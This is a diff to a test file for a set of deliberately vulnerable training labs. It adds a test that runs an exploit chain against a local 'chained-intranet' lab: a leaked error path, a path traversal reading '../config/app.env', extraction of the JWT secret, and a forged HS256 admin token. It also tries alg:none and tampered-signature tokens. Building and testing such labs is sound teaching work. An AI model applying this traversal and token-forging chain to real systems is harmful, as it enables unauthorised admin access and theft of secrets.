@@ -1,5 +1,5 @@
 import { spawn, spawnSync, type ChildProcess } from 'node:child_process';
-import { randomBytes } from 'node:crypto';
+import { createHmac, randomBytes } from 'node:crypto';
 import { existsSync } from 'node:fs';
 import { afterAll, describe, expect, it } from 'vitest';
 
@@ -65,7 +65,7 @@ const json = (body: unknown, token?: string) => ({
 const bearer = (token: string) => ({ headers: { authorization: `Bearer ${token}` } });
 
 describe('labs refuse to start without a flag', () => {
-  it.each(['sqli-login', 'idor-invoices', 'mass-assignment', 'ssrf-preview', 'path-traversal', 'command-injection', 'jwt-none', 'xss-stored'])('%s', async (name) => {
+  it.each(['sqli-login', 'idor-invoices', 'mass-assignment', 'ssrf-preview', 'path-traversal', 'command-injection', 'jwt-none', 'xss-stored', 'chained-intranet'])('%s', async (name) => {
     const child = spawn(process.execPath, [`labs/${name}/server.mjs`], { env: { PATH: process.env.PATH }, stdio: 'ignore' });
     expect(await new Promise((resolve) => child.on('exit', resolve))).toBe(1);
   });
@@ -201,4 +201,29 @@ describe.skipIf(chrome === undefined)('lab xss-stored', () => {
     }
     expect(page).toContain(`session_moderateur=${flag}`);
   }, 60_000);
+});
+
+describe('lab chained-intranet', () => {
+  it('no single flaw is enough; traversal → leaked secret → forged admin token is', async () => {
+    const flag = newFlag();
+    const base = await lab('chained-intranet', flag);
+    const login = (await (await fetch(`${base}/api/connexion`, json({ identifiant: 'invite', mot_de_passe: 'invite' }))).json()) as { jeton: string };
+    expect((await fetch(`${base}/api/admin/rapport`, bearer(login.jeton))).status).toBe(403);
+    // alg:none and tampering are refused: the JWT check itself is sound.
+    const admin = Buffer.from(JSON.stringify({ sub: 'x', role: 'admin' })).toString('base64url');
+    const none = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
+    expect((await fetch(`${base}/api/admin/rapport`, bearer(`${none}.${admin}.`))).status).toBe(401);
+    const [head, , sig] = login.jeton.split('.');
+    expect((await fetch(`${base}/api/admin/rapport`, bearer(`${head ?? ''}.${admin}.${sig ?? ''}`))).status).toBe(401);
+    // The error message gives the documents' location; the traversal reads the config.
+    const leak = await (await fetch(`${base}/documents?nom=nope`)).text();
+    expect(leak).toMatch(/Introuvable : .*documents/);
+    const config = await (await fetch(`${base}/documents?nom=${encodeURIComponent('../config/app.env')}`)).text();
+    expect(config).not.toContain(flag);
+    const secret = /JWT_SECRET=([0-9a-f]+)/.exec(config)?.[1] ?? '';
+    expect(secret).toHaveLength(64);
+    const h = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
+    const forged = `${h}.${admin}.${createHmac('sha256', secret).update(`${h}.${admin}`).digest('base64url')}`;
+    expect(((await (await fetch(`${base}/api/admin/rapport`, bearer(forged))).json()) as { reference: string }).reference).toBe(flag);
+  });
 });
